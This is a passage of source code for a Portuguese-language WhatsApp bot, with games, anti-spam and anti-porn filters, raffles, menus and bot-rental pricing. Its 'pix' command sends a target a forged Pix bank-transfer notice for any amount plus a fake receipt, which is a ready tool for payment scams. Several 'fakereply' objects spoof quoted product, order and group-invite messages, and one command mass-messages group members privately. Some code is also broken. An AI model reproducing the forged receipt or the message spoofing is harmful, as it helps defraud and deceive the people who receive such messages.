if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Você escolheu ${m.text} ${!roof.pilih2 ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih2) aqua.sendText(roof.p2, '_O oponente já escolheu_\nAgora é sua vez.', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Você escolheu ${m.text} ${!roof.pilih ? `\n\nEsperando que o oponente escolha` : ''}`)
if (!roof.pilih) aqua.sendText(roof.p, '_O oponente já escolheu_\nAgora é sua vez.', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
aqua.sendText(roof.asal, `_*Resultados do jogo*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Ganhou \n` : ` Perdido \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Ganhou \n` : ` Perdido \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=====================================
const isFiltered = (sender) => !!usedCommandRecently.has(sender)


const addFilter = (sender) => {
    usedCommandRecently.add(sender)
    setTimeout(() => usedCommandRecently.delete(sender), 4000) 
}
//=====================================
		

//=====================================
	
	
	///////////ANTI-SPAM BY ITALU/////////
if (isCmd && isFiltered(sender) && !isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff = `*Flood detectado, espere 2 segundos*`
return reply(ff)
}


if (isAntiLinkHard && isUrl(budy) && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM] - LINK', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${budy}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
return 
}


if (isCmd && isFiltered(sender) && isGroup) {
console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))
if(info.key.fromMe) return 
const ff1 = `*Flood detectado, espere 2 segundos*`
return reply(ff1)
}
}
if ((isAntiPorn && isBotGroupAdmins)) {
                if (type === 'imageMessage') {
                    buff = await getFileBuffer(mek.message.imageMessage, 'image')
                    ran = getRandom('.'+await getExtension(mek.message.imageMessage.mimetype))
                    fs.writeFileSync(ran, buff)
                    const upload = await uploadimg('brizaloka', ran, ran)
                    setTimeout(async () => {
                        anu = await fetchJson(`https://brizas-api.herokuapp.com/ia/porndetect?apikey=brizaloka&img=${upload.resultado.link}`)
                        console.log(anu);
                        if(parseInt(anu.probabilidades.porno) >= 70 && isGroupAdmins)  {
                            await aqua.sendMessage(from,{text: adminmsgporn}, {quoted: selo})
                            fs.unlinkSync(ran)
                            return
                        } else if(parseInt(anu.probabilidades.porno) >= 70 && !isGroupAdmins) {
                            await aqua.sendMessage(from,{text: banmsgporn}, {quoted: selo})
                            setTimeout(async function () {
                                aqua.groupParticipantsUpdate(from, [sender], 'remove')
                                fs.unlinkSync(ran)
                            }, 2000)
                            return
                        }
                        if(parseInt(anu.probabilidades.hentai) >= 70 && isGroupAdmins) {
                            await aqua.sendMessage(from,{text: adminmsgporn}, {quoted: selo})
                            fs.unlinkSync(ran)
                            return

                        }  else if(parseInt(anu.probabilidades.hentai) >= 70 && !isGroupAdmins) {
                            await aqua.sendMessage(from,{text: banmsgporn}, {quoted: selo})
                            setTimeout(async function () {
                                aqua.groupParticipantsUpdate(from, [sender], 'remove')
                                fs.unlinkSync(ran)
                            }, 2000)
                            return
                        }
                        if(parseInt(anu.probabilidades.sexy) >= 70) {
                            aqua.sendMessage(from,{text: 'Cuidado com oq manda em amigo, to com antiporn ativado'}, {quoted: selo})
                            fs.unlinkSync(ran)
                        }
                    }, 1600);
}
}
	
//====================================


//========MIDIA=============\\


//=============SELOS=============

//FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "120363042083601149@g.us" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": log0},
"title": "LICHT SAN", 
"description": "AQUA BOT SUPREMACY", 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": "LICHT SAN",
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

//=====================================

//FAKEREPLY TROLI
const ftroli = {
key : {
participant : '553175416530@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 1,
status: 1,
surface : 1,
message: 'My[P.L]',
orderTitle: 'Bang',
thumbnail: log0,
sellerJid: '0@s.whatsapp.net'

}
}
}

//=====================================

//FAKEREPLY LOCATION
const flokasi = {
key : {
 participant : '553175416530@s.whatsapp.net'
},
message: {
locationMessage: {
name: 'BRASIL',
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY DOCUMENT
const fdocs = {
key : {
 participant : '553175416530@s.whatsapp.net'
},
message: {
documentMessage: {
title: 'OLÁ BEM?', 
jpegThumbnail: log0
}
}
}

//=====================================

//FAKEREPLY GROUPINVITE
const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "120363042083601149@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P", 
"caption": "OLÁ BOM JOGO", 
'jpegThumbnail': log0
}
}
}

//=====================================

//FAKEREPLY GIF
const fgif = {
key: { 
fromMe: false,
participant: `553175416530@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":"LICHT SAN",
 "h": `Hmm`,
 'seconds': "30", 
 'gifPlayback': 'true', 
 'caption': 'AQUA-BOT-SUPREMACY',
 'jpegThumbnail': log0
}
}
} 

//=====================================

//FAKEREPLY TEXT WITH THUMBNAIL
const fakey = (teks) => {
aqua.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `SÓ FÉ 😎`,"body": `LINK GRUPO AQUA BOT SUPREMACY`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./mídia-ft-vd/fotos/deusa.jpg`),"sourceUrl": "https://chat.whatsapp.com/ijpmhmhk96wc68nvglc9vk"}}}, { quoted: selo})
}
const ftextt = {
key: { 
fromMe: false,
participant: `553175416530@s.whatsapp.net`, ...(from ? 
{ remoteJid: "6289643739077-1613049930@g.us" } : {}) 
},
message: { 
"extendedTextMessage": {
 "text":"OLÁ BEM? ",
"title": `Hmm`,
 'jpegThumbnail': log0
}
} 
}

//=====================================

//FAKEREPLY VN
const fvn = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "120363042083601149@g.us" } : {}) 
},
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "22:33",
"ptt": "true"
}
} 
}
l = 1
monospace = '```'


 
const enviarOrda = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid, // Change ID
"thumbnail": img, // Change the Image
"itemCount": itcount, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": title, // Change the title
"message": text, // Change Message
"sellerJid": sellers, // Change the seller
"token": tokens, // Change the token
"totalAmount1000": ammount, // Change the Total Amount
"totalCurrencyCode": "BRL", // Up to you
}
}), { userJid: jid })
aqua.relayMessage(jid, order.message, { messageId: order.key.id})
}

const enviarCatalog = async(jid, titulo, texto, valor) => {
const catalog = generateWAMessageFromContent(jid, proto.Message.fromObject({
"productMessage": {
"product": {
	"productImage": {
			"url": "https://mmg.whatsapp.net/d/f/An6ssWQrEx3DYOvrXx5Ld5-1zzyW8DpRhZvr2ZCKrIu-.enc",
			"mimetype": "image/jpeg",
			"fileSha256": "fR9ZYUp6oPISWJNO6ywrBBNck0OpSw7FYL6XPXjKS6M=",
			"fileLength": "13000",
			"height": 50,
			"width": 50,
			"mediaKey": "/BQzqmWzeGOB1X7aPOCAxbVUeZL18bw3v9J7yA0Vn2Y=",
			"fileEncSha256": "C7LQFJx65AAS6sdALkCGNmDC+0NWilRBH8zHa+Lt4x4=",
			"directPath": "/v/t62.7118-24/35880876_730612661375500_4224816547459430339_n.enc?ccb=11-4&oh=01_AVxtkNgm-pIDHhEhvkfWXRnfU9WbYIckQFKZrtbZuAzGmw&oe=631A1B4E&_nc_hot=1660217709",
			"mediaKeyTimestamp": "1660217472",
			"jpegThumbnail": userppbuff
		},
		"productId": "553175416530",
		"title": titulo,
		"description": texto,
		"currencyCode": "BRL",
		"priceAmount1000": valor,
		"productImageCount": 2
		},
	"businessOwnerJid": "553175416530@s.whatsapp.net"
	}
}), { userJid: jid })
aqua.relayMessage(jid, catalog.message, { messageId: catalog.key.id})
}


//========BOTÃO DO AKINATOR)=============

switch(argsButton[0]) {
case 'finaki':
if(argsButton[1] == 'nao') {
reply('*Puxa não foi desta vez 😔*')
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
} else {
reply('*SABIA! EU VENCI OTÁRIO 🥳*')
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
}
break
case 'akinator':
if(argsButton[1] == 'nao') return reply('*Até a próxima amigo*') 
if(akinator[0][from]) return reply('*Desculpe-me amigo alguem ja está jogando, aguarde pra chegar sua vez*')
akinator[0][from] = {
    id: from,
    player: sender,
    game: new Aki({region: 'pt'})
}
await akinator[0][from].game.start()
listMessage = {
    text: akinator[0][from].game.question,
    footer: 'Mostrar opções',
    buttonText: 'Opções',
    title: "Pergunta",
    sections: [{
title: 'Opções',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'Não',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'Não sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente não',
description: ''
}]
    }]
}
aqua.sendMessage(from, listMessage)
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
break
}

//========INÍCIO DAS CASES=============


switch(command) {

//=========TESTE DE CMDD========//
case 'tagme':
const tagme = {
text: `> @${sender.split("@")[0]}`, contextInfo: {mentionedJid: [sender]}
}
await aqua.sendMessage(from, tagme, text)
break



case 'sorteio':
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteio de 100 R$`)
d = []
teks = `[💧] PARABÉNS, VOCÊ É O SORTUDO DO GRUPO\n\n`
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `┠➥ *[🔹] USUÁRIO*  @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'sorteionumeros':  
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')  
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, após o comando sorteio, por exemplo, ${prefix}sorteionumero de 100 R$`)
var numerossrt = sortear[Math.floor(Math.random() * sortear.length)] 
d = []
teks =  `[💧] PARABÉNS, VOCÊ É O SORTUDO DO GRUPO\n\n`
for(i = 0; i < 1; i++) {
teks += `┠➥ *[🔹] NÚMERO:* ${numerossrt}\n`
d.push(numerossrt)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'pix':
{
txt = args.join(" ")
if(!txt) return reply(`Exemplo: ${prefix + command} +55 31 7541-6530/30`)
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return reply('CHAVE PIX DA PESSOA?/número de telefone')
if(!txt2) return reply('QUAL O VALOR DO PIX?')
let [result] = await aqua.onWhatsApp(txt1)
if(!result) return reply(`Número inválido`)
bla = 
`[💠]  𝗣𝗜𝗫 𝗗𝗘𝗨𝗦𝗔 𝗔𝗤𝗨𝗔  [💠]
Transferência Pix Recebida Com  Sucesso

[👤] 𝗢𝗥𝗜𝗚𝗘𝗠: ${pushname}
[🏦] 𝗕𝗔𝗡𝗖𝗢: AQUA SUPREMACY
[💱] 𝗧𝗔𝗥𝗜𝗙𝗔: Grátis 
[💸] 𝗩𝗔𝗟𝗢𝗥: ${txt2},00`
aqua.sendMessage(result.jid, {text: bla})
reply(`[💠] 𝗖𝗢𝗠𝗣𝗥𝗢𝗩𝗔𝗡𝗧𝗘 [💠]\nTransferência Pix Realizada com Sucesso\n\n[💱] 𝗧𝗔𝗥𝗜𝗙𝗔: Gratis\n[👤] 𝗢𝗥𝗜𝗚𝗘𝗠: ${pushname}\n[📆] 𝗗𝗔𝗧𝗔: ${date}\n[⏱️] 𝗛𝗢𝗥𝗔: ${time}\n\n[🗣️] 𝗗𝗘𝗦𝗧𝗜𝗡𝗢: wa.me/${result.jid.split("@")[0]}\n[💸] 𝗩𝗔𝗟𝗢𝗥: ${txt2},00`)
}
break



case 'bcgp':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
{
const buttons2 = [
  {buttonId: 'null', buttonText: {displayText: 'AQUA BOT SUPREMACY'}, type: 1},
]

const buttonMessage = {
    text: `${q}`,
    footer: 'TRANSMISSÃO DE GRUPO, PARA MEMBROS', 
    buttons: buttons2,
    headerType: 1
}
let users4 = groupMembers.map(u => u.id)
for (let user of users4) if (user.endsWith('@s.whatsapp.net')){
if( user != botNumber){
aqua.sendMessage(user, buttonMessage)
reply("transmissão realizada")
}
}
}
break;

case 'avalie':
const avalie = body.slice(8)
if (args.length <= 1) return reply(`Exemplo: ${prefix}avalie "Bot muito bom, parabéns. "`)
if (args.length >= 400) return aqua.sendMessage(from, 'Máximo 400 caracteres', msgType.text, {quoted: selo})
var nomor = info.participant
tdptls = `*[💧] AVALIAÇÃO [💧]*\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n\n: ${avalie}`
var options = {
text: tdptls,
contextInfo: {
mentionedJid: [sender]
},
}
await aqua.sendMessage(`${global.numerodonoa}@s.whatsapp.net`, options, text, {quoted: selo})
reply("*[💧] MUITO OBRIGADA [💧]*\n\nSua Avaliação Foi Enviada ao Meu Dono, Esterei Sempre Tentando Ser Melhor, Obrigada Humano.")
break

case 'bug':
const bug = body.slice(5)
if (args.length <= 1) return reply(`Exemplo: ${prefix}bug "ocorreu um erro no comando sticker"`)
if (args.length >= 800) return aqua.sendMessage(from, 'Máximo 800 caracteres', msgType.text, {quoted: selo})
var nomor = info.participant
teks1 = `*[💧] BUG [💧]*\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n\nErro ou bug: ${bug}`
var options = {
text: teks1,
contextInfo: {
mentionedJid: [sender]
},
}
await aqua.sendMessage(`${global.numerodonoa}@s.whatsapp.net`, options, text, {quoted: selo})
reply("*[💧] MUITO OBRIGADA [💧]*\n\nReport Enviado ao Meu Dono, Dar Spam Você Sera Bloqueado, e Não Poderá Mais Utilizar o Bot.")
break

case 'sugestão':
case 'sugestao':
const sugestao = body.slice(10)
if (args.length <= 1) return reply(`Exemplo: ${prefix}sugestao "Opa, crie um comando tal, que ele funcione de tal maneira, isso será muito bom, não só pra mim, mas pra vários fazer isso.."`)
if (args.length >= 800) return aqua.sendMessage(from, 'Máximo 800 caracteres', msgType.text, {quoted: selo})
var nomor = info.participant
sug = `[ Sugestões ]\nDe: wa.me/${sender.split("@s.whatsapp.net")[0]}\n: ${sugestao}`
var options = {
text: sug,
contextInfo: {
mentionedJid: [sender]
},
}
await aqua.sendMessage(`${global.numerodonoa}@s.whatsapp.net`, options, text, {quoted: selo})
reply("mensagem enviada ao meu dono, obrigado pela sugestão, tentarei ouvir o máximo possível de sugestões.")
break

case 'mf' : {         
        let q = quoted ? quoted : info
		jjjj = fs.readFileSync('audios/admin.mp3')
aqua.sendMessage(from, {audio: jjjj, mimetype: 'audio/mpeg', ptt: true, contextInfo: {externalAdReply : {title : `AQUA BOT SUPREMACY`, renderLargerThumbnail:false, showAdAttribution: true, body: `┠➥  𝙋𝙤𝙞𝙨 𝙎𝙖𝙞𝙗𝙖𝙢 𝙦𝙪𝙚𝙢 𝙨𝙤𝙪, 𝙎𝙤𝙪 𝙤 𝙦𝙪𝙚 𝙙𝙞𝙯𝙚𝙢 𝙙𝙚 𝙢𝙞𝙢...\n𝙎𝙤𝙪 𝙩𝙪𝙙𝙤 𝙤 𝙦𝙪𝙚 𝙧𝙚𝙨𝙩𝙤𝙪 𝙙𝙤 𝙃𝙚𝙧𝙤́𝙞\n┠\n┠@aquabot.wpp\n┠@akashizin_zueiraaaa\n┠@b2kgaming.gg`, mediaUrl: `www.instagram.com`, mediaType: 2, thumbnail: fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg') }}}) 
       }
       break

case 'wame':
 aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
 try {
ppimg = await aqua.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
me = aqua.user
uptime = process.uptime()
teks = `
╭━━━━━◉                                     ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
          ㅤ         ㅤ 🇼 🇦 🇲 🇪     ㅤ  ㅤ
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉     ${tempo}       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ 
┠➥ *[🗣️] NICK:*  ${pushname}
┠➥ *[📱] NÚMERO:* ${sender.split("@s.whatsapp.net")[0]}
┠➥ *[📌] LINK:* https://wa.me/${sender.split("@s.whatsapp.net")[0]}
┠➥ *[📌] LINK2:* https://api.whatsapp.com/send?phone=${sender.split("@")[0]}
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`
daftarimgg = await getBuffer(ppimg)
aqua.sendMessage(from, {image: daftarimgg, caption: teks, mentions: [aqua.user.id]})
break

case 'lembrete':
if (!isGroupAdmins) return reply(enviar.msg.adm)
				if (args[1]=="S","s") {var timer = args[0]+"000"
				} else if (args[1]=="M","m") {var timer = args[0]+"0000"
				} else if (args[1]=="H","h") {var timer = args[0]+"00000"
				} else {return reply("*Escolha:*\nS = segundos\nM = minutos\nH = horas")}
				setTimeout( () => {
				reply(`Olá ${pushname}\nO Tempo Acabou...`)
				}, timer)
				reply("Certo, Irei Lembrar Você, quando o Tempo Acabar.")
				break

case 'sn':
const sn = ['sim', 'não']
const gosto = body.slice(3)
if (args.length < 1) return aqua.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${p}sn O ${SeuNome} é um baiano preguiçoso?`, text, {quoted: selo})
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nPelo Meu Poder Divino\nCreio Fortemente Que... ${jawab}`
reply(hasil)
break

case 'naruto2':
 reply(`💦𝗔𝗴𝘂𝗮𝗿𝗱𝗲 𝘂𝗺 𝗣𝗼𝘂𝗰𝗼...`)
buttonnns = [
{buttonId: `${prefix}naruto2`, buttonText: {displayText: '[??] 𝗣𝗥𝗢́𝗫𝗜𝗠𝗔 [💧]'}, type: 1}]

buttonMessaaage = {
video: {url: 'https://telegra.ph/file/c47a25d5d52e8b652d750.mp4'},
caption: "[💦] 𝗡𝗔𝗥𝗨𝗧𝗢 𝗘𝗗𝗜𝗧 [💧]",
footerText: '[💦] AQUA BOT OFICIAL  [💧]',
buttons: buttonnns,

headerType: 4
}
sendMsg = aqua.sendMessage(from, buttonMessaaage, {quoted: selo})
Break

case 'ej':
for(i=1; i < 6; i++){
bla = fs.readFileSync(`./fig2/${i}.webp`);
aqua.sendMessage(sender, {sticker:bla}, {quoted: selo})
}
reply(`Olha Seu PV ${pushname}`)
break
// mandar 10 stickers



case 'login': //comando em teste
registros.push(sender)
fs.writeFileSync('./registros.json',JSON.stringify(registros))
reply("opa")
await delay(1000)
reply(`
◥◣★◢◤
❴ ${tempo} ❵
❴ Login Feito Com Sucesso ❵

❴ Nome: ${pushname} ❵
❴ Número: ${sender.split('@')[0]} ❵
❴ Celular: ${info.key.id.length > 21 ? 'Android 😴' : info.key.id.substring(0, 2) == '3A' ? 'IOS 😑' : 'WhatsApp web 😅'} ❵
❴ Horário: ${time2} ❵
❴ Data: ${data} ❵

❴🥀❵ Parabéns Por Registrar-Se ❴🥀❵`)
break


case 'registro': //comando em teste
aqua.sendMessage(from, { react: { text: `👑`, key: info.key }})               
sendBimgT(from, `${logo}`, `*[💧] OLÁ HUMANO:* ${pushname}\nDESEJA SE REGISTRAR NO MEU SISTEMA?\nCLICK NO BOTÃO DE LOGIN ABAIXO`, "AQUA BOT SUPREMACY", [
{index: 1, urlButton: {displayText: '[💧] QUERO SER PREMIUM [💧]', url: 'https://wa.me/553175416530'}},
{index: 2, urlButton: {displayText: '[💧] QUERO SER VIP [💧]', url: 'https://wa.me/553175416530'}},
{index: 5, quickReplyButton: {displayText: '[💧] LOGIN [💧]', id: `${prefix}login`}}], selo)
break

case 'reversetxt': {
if (args.length < 1) return reply(`*[🔹] EXEMPLO:*\n${prefix}reversetxt AQUA SOLA`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 TEXTO REVERSO 」\`\`\`\n\n*[💦] NORMAL:*  ${quere}\n\n*[💧] REVERSO:*  ${flipe}`)
}
break

case 'alugar':
await aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})

let menutxt =
 ` ▂▃▄▅▆▇█  𝗔𝗤𝗨𝗔  𝗦𝗨𝗣𝗥𝗘𝗠𝗔𝗖𝗬  █▇▆▅▄▃▂
 
 
┠➥  01,00 > 1 Dia
┠➥  05,00 > 7 Dias
┠➥  15,00 > 30 Dias
┠➥  30,00 > Bot Vip
┠➥  35,00 > Bot Vip 2
┠➥  40,00 > Bot Vip 3
┠➥  50,00 > Premium
┠➥  80,00 > Bot Descriptografado`
reply('verifique seu privado...')
await enviarCatalog(from, '[💦] 𝗔𝗤𝗨𝗔 𝗕𝗢𝗧 𝗢𝗙𝗜𝗖𝗜𝗔𝗟 [💧]', menutxt, 30000)
await enviarOrda(sender, menutxt, "81828", fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg'), `13`, `333`, "553175416530@s.whatsapp.net", "AR7RorqhCmsQ+f+T/VSgwBx3gc81RZtizDRtI8rGDJ2O6Q==", "13")
break

//========MENUS=============//

case 'menu':
adivinhaa = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
aqua.sendMessage(from, { react: { text: `💙`, key: m.key }})
sendBimg(from, `${logo}`, menu(prefix, pushname, numerodn, isGroup, groupName, adivinhaa, NomeDoBot, `Wa.me/${sender.split('@')[0]}`), `〘 ${NomeDoBot} 〙`, 
[{buttonId: `${prefix}menusticker`, buttonText: {displayText: `[💦] MENU STICKER [💦]`}, type: 1},
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `[💦] MENU ADMS [💦]`}, type: 1},
{buttonId: `${prefix}menulist`, buttonText: {displayText: `[💦] MENU LIST  [💦]`}, type: 1}], selo)
break

case 'menupremium':
case 'menuprem':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
sendBimg(from, `${logo}`, menuprem(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}info`, buttonText: {displayText: `[💦] INFO BOT [💧]`}, type: 1},
{buttonId: `${prefix}menulist`, buttonText: {displayText: `[💦] MENU LIST [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)
break 

case 'menudono':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, menudono(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}info`, buttonText: {displayText: `[💦] INFO BOT [💧]`}, type: 1},
{buttonId: `${prefix}menupremiun`, buttonText: {displayText: `[💦] MENU PREMIUM [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)
break 

case 'menuadm':
case 'menuadms':
case 'adm':  
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
bla = fs.readFileSync('audios/admin.mp3')
aqua.sendMessage(from, {audio: bla, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
sendBimg(from, `${logo}`, menuadm(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}brincadeiras`, buttonText: {displayText: `[💦] BRINCADEIRAS [💧]`}, type: 1},
{buttonId: `${prefix}alteradores`, buttonText: {displayText: `[💦] ALTERADORES [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)
break 

case 'menulogo2':  
case 'menulogos':
case 'logos':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, menulogos(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}ping`, buttonText: {displayText: `[💦] PING [💧]`}, type: 1},
{buttonId: `${prefix}alteradores`, buttonText: {displayText: `[💦] MENU ALTERADOES [💧]`}, type: 1},
{buttonId: `${prefix}brincadeiras`, buttonText: {displayText: `[💦] MENU BRINCADEIRAS [💧]`}, type: 1}], selo)
break 

case 'brincadeira':
case 'brincadeiras':
case 'menubrincadeiras':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, brincadeiras(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}menuadm`, buttonText: {displayText: `[💦] MENU ADM [💧]`}, type: 1},
{buttonId: `${prefix}menulogos`, buttonText: {displayText: `[💦] MENU LOGOS [💧]`}, type: 1},
{buttonId: `${prefix}menupremium`, buttonText: {displayText: `[💦] MENU PREMIUM [💧]`}, type: 1}], selo)
break 

case 'alterador':
case 'alteradores':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, alteradores(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}brincadeiras`, buttonText: {displayText: `[💦] BRINCADEIRAS [💧]`}, type: 1},
{buttonId: `${prefix}menulist`, buttonText: {displayText: `[💦] MENU LIST [💧]`}, type: 1},
{buttonId: `${prefix}menusticker`, buttonText: {displayText: `[💦] MENU STICKER [💧]`}, type: 1}], selo)
break 

case 'menustick':
case 'menusticker':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, sticker(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}info`, buttonText: {displayText: `[💦] FICHA TÉCNICA [💧]`}, type: 1},
{buttonId: `${prefix}menulist`, buttonText: {displayText: `[💦] MENU LIST [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)
break 

case 'menuhentai':
case 'hentaimenu':
aqua.sendMessage(from, { react: { text: `💦`, key: m.key }})
sendBimg(from, `${logo}`, menuhentai(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}info`, buttonText: {displayText: `[💦] FICHA TÉCNICA [💧]`}, type: 1},
{buttonId: `${prefix}hentailist`, buttonText: {displayText: `[💦] HENTAI LIST [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)
break 

case 'owner':
case 'odono':
case 'dono': 
case 'infodono': 
aqua.sendMessage(from, { react: { text: `💙`, key: m.key }})
 numerodn = numerodonoa
sendBimg(from, `${logo}`, menudono(prefix), "[💦] Leia Com Atenção [💧]", [
{buttonId: `${prefix}brincadeiras`, buttonText: {displayText: `[💦] BRINCADEIRAS [💧]`}, type: 1},
{buttonId: `${prefix}alteradores`, buttonText: {displayText: `[💦] ALTERADORES [💧]`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `[💦] MENU COMPLETO [💧]`}, type: 1}], selo)

let vcard = 
'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ 'FN: LICHT SAN OFICIAL\n' //SEU NOME
+ 'ORG:AQUA BOT SUPREMACY ;\n' // SEGUNDO NOME
+ 'TEL;type=CELL;type=VOICE;waid=553175416530:+55 31 7541-6530\n'// SEU NÚMERO 
